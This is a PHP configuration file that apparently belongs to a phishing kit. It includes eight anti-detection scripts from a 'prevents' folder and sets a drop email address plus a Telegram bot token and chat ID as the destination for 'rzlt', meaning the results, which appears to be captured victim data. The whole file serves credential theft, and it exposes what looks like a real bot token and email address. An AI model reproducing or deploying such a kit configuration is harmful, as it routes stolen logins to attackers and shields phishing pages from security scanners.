<?php
/*

 
                                                                                                
                                                                                                
                                                                                                

*/
include '../prevents/anti1.php';
include '../prevents/anti2.php';
include '../prevents/anti3.php';
include '../prevents/anti4.php';
include '../prevents/anti5.php';
include '../prevents/anti6.php';
include '../prevents/anti7.php';
include '../prevents/anti8.php';

$email ="athyestdz@yahoo.com"; 

//telgram rzlt
$api = "bot5201175898:AAEp5ehOORr9GEzRROikDN6fhyZy5Z_FBS0";
$chatid = "1018946541";


?>